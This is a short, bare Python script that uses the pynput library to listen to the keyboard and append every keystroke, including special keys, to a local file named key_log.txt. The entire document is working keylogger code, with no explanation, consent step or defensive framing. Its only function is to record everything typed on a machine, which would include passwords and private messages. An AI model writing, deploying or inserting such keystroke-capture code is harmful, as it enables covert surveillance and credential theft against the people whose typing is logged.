from pynput import keyboard

# File to log keys
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}\n')  # for alphabet keys
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f'{key}\n')  # for special keys

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
